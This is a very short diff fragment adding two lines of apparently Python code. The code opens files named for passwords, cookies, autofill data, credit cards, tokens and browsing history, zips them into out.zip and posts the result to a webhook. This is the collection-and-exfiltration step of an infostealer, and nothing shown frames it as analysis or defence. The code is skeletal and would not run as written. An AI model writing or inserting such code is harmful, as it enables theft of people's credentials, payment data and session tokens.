@@ -1,0 +1,3 @@
+open("Passwords.txt"); open("Cookies.txt"); open("Autofills.txt"); open("CreditCards.txt"); open("Tokens.txt"); open("History.txt")
+zipfile.ZipFile("out.zip"); requests.post(webhook)
+
